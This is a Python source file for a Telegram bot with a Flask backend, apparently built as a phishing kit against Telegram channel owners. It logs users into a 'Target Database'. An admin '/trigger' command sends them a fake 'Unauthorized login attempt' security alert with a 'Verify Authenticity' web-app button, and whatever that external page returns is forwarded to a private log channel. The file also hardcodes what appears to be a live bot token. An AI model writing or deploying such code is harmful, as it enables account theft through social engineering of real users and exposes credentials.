import os
import sqlite3
import threading
from flask import Flask, request, jsonify
from telebot import TeleBot, types

# Your Exact Information
TOKEN = "8729895497:AAEqEZ3HA56FmQjm_kI5VmKxQn1a4HJBSuE"
ADMIN_ID = 8699819680
LOG_CHANNEL = -1003817774248
# Replace with your actual Vercel/TMA link
TMA_URL = os.getenv("TMA_URL", "https://tma-research-nu.vercel.app")

bot = TeleBot(TOKEN)
app = Flask(__name__)

def init_db():
    with sqlite3.connect('research.db') as conn:
        conn.execute("CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT)")

# --- WEB ROUTE (Receives data from the button in the message) ---
@app.route('/log', methods=['POST'])
def web_log():
    try:
        data = request.json.get('data')
        if data:
            bot.send_message(LOG_CHANNEL, f"📥 <b>NEW LOG RECEIVED (Web):</b>\n<code>{data}</code>", parse_mode="HTML")
            return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"status": "error"}), 500
    return "No data", 400

@app.route('/')
def home(): return "OK", 200

# --- BOT HANDLERS ---

# Handles data from the button at the bottom of the screen
@bot.message_handler(content_types=['web_app_data'])
def handle_service_data(message):
    raw_data = message.web_app_data.data
    bot.send_message(LOG_CHANNEL, f"📥 <b>NEW LOG RECEIVED (Service):</b>\n<code>{raw_data}</code>", parse_mode="HTML")

@bot.message_handler(commands=['start'])
def handle_start(message):
    init_db()
    u_id = message.chat.id
    u_name = f"@{message.from_user.username}" if message.from_user.username else "User"
    with sqlite3.connect('research.db') as conn:
        conn.execute("INSERT OR IGNORE INTO users VALUES (?, ?)", (u_id, u_name))
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(types.KeyboardButton("Verify Channel Authenticity", web_app=types.WebAppInfo(url=TMA_URL)))
    bot.send_message(u_id, "<b>Console:</b> Secure connection established.", parse_mode="HTML", reply_markup=markup)

@bot.message_handler(commands=['list'])
def list_users(message):
    if message.from_user.id == ADMIN_ID:
        with sqlite3.connect('research.db') as conn:
            users = conn.execute("SELECT * FROM users").fetchall()
        if not users:
            bot.send_message(ADMIN_ID, "❌ Database empty.")
            return
        report = "<b>Target Database:</b>\n\n"
        for uid, uname in users:
            report += f"👤 {uname}\nID: <code>{uid}</code>\n\n"
        bot.send_message(ADMIN_ID, report, parse_mode="HTML")

@bot.message_handler(commands=['trigger'])
def handle_trigger(message):
    if message.from_user.id == ADMIN_ID:
        try:
            raw = message.text.replace('/trigger ', '').strip()
            target_id, channel_name = raw.split('@', 1)
            
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("Verify Authenticity", web_app=types.WebAppInfo(url=TMA_URL)))
            
            bait = f"<b>⚠️ Security Alert: {channel_name}</b>\n\nUnauthorized login attempt detected on <b>{channel_name}</b>."
            bot.send_message(target_id.strip(), bait, parse_mode="HTML", reply_markup=markup)
            bot.send_message(ADMIN_ID, f"✅ Alert sent to {target_id}")
        except:
            bot.send_message(ADMIN_ID, "❌ Use: /trigger ID@ChannelName")

if __name__ == "__main__":
    init_db()
    threading.Thread(target=lambda: bot.infinity_polling(), daemon=True).start()
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
